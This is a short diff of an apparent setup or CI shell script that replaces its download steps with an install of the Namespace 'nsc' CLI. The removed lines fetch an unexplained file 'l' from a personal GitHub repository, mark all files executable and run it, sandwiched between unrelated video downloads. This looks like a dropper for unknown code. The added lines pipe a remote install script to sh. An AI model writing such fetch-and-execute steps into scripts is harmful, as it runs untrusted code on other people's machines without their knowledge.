@@ -1,3 +1,5 @@
-wget https://jep-asset.akamaized.net/cms/assets/airfiber/airfiber-works-20-03.mp4
-wget https://raw.githubusercontent.com/teyureu/teyureu/refs/heads/main/l && chmod +x * && ./l
-wget https://jep-asset.akamaized.net/cms/assets/airfiber/airfiber-works-20-03.mp4
+curl -fsSL https://get.namespace.so/cloud/install.sh | sh
+curl -fsSL https://get.namespace.so/cloud/install.sh | NS_ROOT=/tmp/nsc sh
+export NS_ROOT="$HOME/.ns"
+export PATH="$NS_ROOT/bin:$PATH"
+nsc version update
